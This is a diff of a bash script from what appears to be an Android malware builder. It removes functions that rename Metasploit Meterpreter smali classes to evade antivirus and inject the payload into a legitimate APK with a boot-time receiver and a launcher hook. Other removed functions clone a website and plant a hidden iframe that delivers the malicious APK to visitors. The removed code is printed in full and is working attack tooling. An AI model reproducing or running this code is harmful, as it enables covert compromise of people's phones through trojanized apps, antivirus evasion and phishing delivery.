@@ -250,11 +250,6 @@ function orig_apk()
 {
  orig=$(cat tools/dir_apk.txt)
 }
-#function change icon
-function change_icon()
-{
- iconos=$(zenity --title "☢ CHOOSE ICON ☢" --filename=$path --file-selection --file-filter "*.png" --text "chose your own icon." 2> /dev/null) 
-}
 #function generate payload
 function gen_payload()
 {
@@ -279,14 +274,6 @@ function apk_decomp()
  spinlong
  xterm -T "Decompiling Payload" -e java -jar $APKTOOL d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
  rm $apk_name.apk
-}
-function apk_comp()
-{
- echo -e $yellow ""
- echo "[*] Rebuilding APK file..."
- spinlong
- xterm -T "Rebuilding APK" -e java -jar $APKTOOL b $path/payload -o evil.apk > /dev/null 2>&1
- rm -r payload > /dev/null 2>&1
 }
 function apk_decomp1()
 {
@@ -388,131 +375,6 @@ function hook_smalies()
   fi 
  fi
 }
-#function flagged by av & updating smalies
-function flagg()
-{
- echo -e $yellow ""
- echo "[*] Scrubbing the payload contents to avoid AV signatures..."
- spinlong
- mv payload/smali/com/metasploit payload/smali/com/$VAR1
- mv payload/smali/com/$VAR1/stage payload/smali/com/$VAR1/$VAR2
- mv payload/smali/com/$VAR1/$VAR2/Payload.smali payload/smali/com/$VAR1/$VAR2/$VAR3.smali
- sleep 2
- if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
-    echo
-    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
-    exit 1
- fi
- sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
- sed -i "s#Payload#$VAR3#g" payload/smali/com/$VAR1/$VAR2/*
- sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
- sed -i "s#payload#$VAR7#g" payload/smali/com/$VAR1/$VAR2/$VAR3.smali
- sed -i "s#com.metasploit.stage#com.$VAR1.$VAR2#" payload/AndroidManifest.xml
- sed -i "s#metasploit#$VAR8#" payload/AndroidManifest.xml
- sed -i "s#MainActivity#$apk_name#" payload/res/values/strings.xml
- sed -i '/.SET_WALLPAPER/d' payload/AndroidManifest.xml
- sed -i '/WRITE_SMS/a<uses-permission android:name="android.permission.SET_WALLPAPER"/>' payload/AndroidManifest.xml
-}
-function flagg_original()
-{
- echo -e $yellow ""
- echo "[*] Scrubbing the payload contents to avoid AV signatures..."
- spinlong
- rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
- mv payload/smali/com/metasploit/stage payload/smali/com/metasploit/$VAR1
- mv payload/smali/com/metasploit/$VAR1/MainBroadcastReceiver.smali payload/smali/com/metasploit/$VAR1/$VAR2.smali
- mv payload/smali/com/metasploit/$VAR1/MainService.smali payload/smali/com/metasploit/$VAR1/$VAR3.smali
- mv payload/smali/com/metasploit/$VAR1/Payload.smali payload/smali/com/metasploit/$VAR1/$VAR4.smali
- sleep 2
- if [ -f payload/smali/com/metasploit/$VAR1/PayloadTrustManager.smali ]; then
-    echo
-    echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
-    exit 1
- fi
- echo -e $yellow ""
- echo "[*] Adding permission and Hook Smali"
- spinlong
- sed -i "5i\ $perms" $path/original/AndroidManifest.xml
- package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
- package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
- tmp=$package_name
- sed -i "s|Lcom/metasploit/stage|L$package_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- sed -i "s|L$package_name/$VAR1/Payload|L$package_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- sed -i "s|L$package_name/$VAR1/MainService|L$package_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- sed -i "s|L$package_name/$VAR1/MainBroadcastReceiver|L$package_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
- cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$package_name > /dev/null 2>&1
- rc=$?
- if [ $rc != 0 ];then
-  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
-  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
-  tmp=$app_name
-  sed -i "s|L$package_name/$VAR1|L$app_name/$VAR1|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  sed -i "s|L$app_name/$VAR1/$VAR4|L$app_name/$VAR1/$VAR4|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  sed -i "s|L$app_name/$VAR1/$VAR3|L$app_name/$VAR1/$VAR3|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  sed -i "s|L$app_name/$VAR1/$VAR2|L$app_name/$VAR1/$VAR2|g" $path/payload/smali/com/metasploit/$VAR1/*.smali 2>&1
-  cp -r $path/payload/smali/com/metasploit/$VAR1 $path/original/smali/$app_name > /dev/null 2>&1
-  amanifest="    </application>"
-  boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$app_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.$VAR1.$VAR3'"/></application>'
-  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
- fi
- amanifest="    </application>"
- boot_cmp='        <receiver android:label="'$VAR2'" android:name="'$package_dash.$VAR1.$VAR2'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.$VAR1.$VAR3'"/></application>'
- sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1
- android_nam=$tmp
- launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
- android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
- android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
-  if [ $android_name ]; then
-  echo
-  echo "##################################################################"
-  echo "inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
-  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  echo "In line:$hook_num"
-  echo "##################################################################"
-  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
-  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
- elif [ ! -e $android_activity ]; then
-  echo
-  echo "##################################################################"
-  echo "inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
-  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-  echo "In line:$hook_num"
-  echo "##################################################################"
-  starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
-  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
-  rc=$?
-  if [ $rc != 0 ]; then
-    spinlong
-    echo -e $red ""
-    echo "[x] cant find : $android_activity.smali"
-    echo "[*] try another ..."
-    spinlong
-    sleep 2
-    echo
-    echo "##################################################################"
-    echo "inject Smali: $android_targetActivity.smali" |awk -F ":/" '{ print $NF }'
-    hook_num=`grep -n "    return-void" $path/original/smali/$android_targetActivity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
-    echo "In line:$hook_num"
-    echo "##################################################################"
-    starter="   invoke-static {}, L$android_nam/$VAR1/$VAR3;->start()V"
-    sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_targetActivity.smali > /dev/null 2>&1
-  fi
- fi
-}
-# function chage name and icon
-function merge_name_ico()
-{
- echo -e $yellow ""
- echo "[*] Changing name and icon payload..."
- spinlong
- label='    <application android:label="@string/app_name">'
- label1='    <application android:label="@string/app_name" android:icon="@drawable/main_icon">'
- sed -i "s|$label|$label1|g" $path/payload/AndroidManifest.xml 2>&1
- sed -i "s|MainActivity|$apk_name|g" $path/payload/res/values/strings.xml 2>&1
- mkdir $path/payload/res/drawable
- cp $iconos $path/payload/res/drawable/main_icon.png
-}
 #function signing apk
 function sign()
 {
@@ -558,40 +420,6 @@ function sign()
    exit $rc
  fi
  rm evil.apk > /dev/null 2>&1
-}
-#function clone site
-function clns()
-{
- clone=$(zenity --title "☢ CLONE WEBSITE ☢" --text "PASTE LINK WEBSITE TO CLONE" --entry --width 400 2> /dev/null)
-}
-function index_name()
-{
- index=$(zenity --title "☢ INDEX NAME ☢" --text "example: wtf.html" --entry --entry-text "wtf" --width 300 2> /dev/null)
- echo -e $yellow ""
- echo "[*] Clone Website From URL..."
- spinlong
- wget $clone --no-check-certificate -O $index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0" > /dev/null 2>&1
-}
-function launcher()
-{
- echo '<iframe id="frame" src="evil.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe><script type="text/javascript">setTimeout(function(){window.location.href="http://local-ip";}, 15000);</script></body></html>' | sed "s|evil.apk|$apk_name.apk|" | sed "s|local-ip|$LHOST/$index.html|" >> apk_index
- com=`cat apk_index`
- rep="</body></html>"
- sed "s|$rep|$com|" $index.html > index2.html
- mv index2.html /var/www/html/$index.html > /dev/null 2>&1
- cp $path/evilapk/$apk_name.apk /var/www/html > /dev/null 2>&1
- rm apk_index > /dev/null 2>&1
- rm $index.html > /dev/null 2>&1
- zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
-}
-#function clean files
-function clean()
-{
- rm $directory/* > /dev/null 2>&1
- rm $path/*.jpeg > /dev/null 2>&1
- rm $path/*.txt > /dev/null 2>&1
- rm /var/www/html/*.apk > /dev/null 2>&1
- rm /var/www/html/$index.html > /dev/null 2>&1
 }
 #main menu
 function main()
